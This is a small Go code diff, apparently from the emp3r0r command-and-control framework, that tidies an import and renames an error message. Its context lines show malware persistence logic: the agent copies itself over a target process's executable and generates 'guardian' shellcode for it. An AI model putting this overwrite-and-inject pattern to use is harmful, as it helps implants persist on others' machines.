@@ -5,10 +5,11 @@ package modules
 
 import (
 	"fmt"
-	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"os"
 	"runtime"
 	"strings"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
@@ -70,7 +71,7 @@ func prepare_guardian_sc(pid int) (shellcode string, err error) {
 	}
 	err = CopySelfTo(proc_exe)
 	if err != nil {
-		return "", fmt.Errorf("failed to overwrite %s with emp3r0r: %v", proc_exe, err)
+		return "", fmt.Errorf("failed to overwrite %s with agent: %v", proc_exe, err)
 	}
 	sc := gen_guardian_shellcode(proc_exe)
 
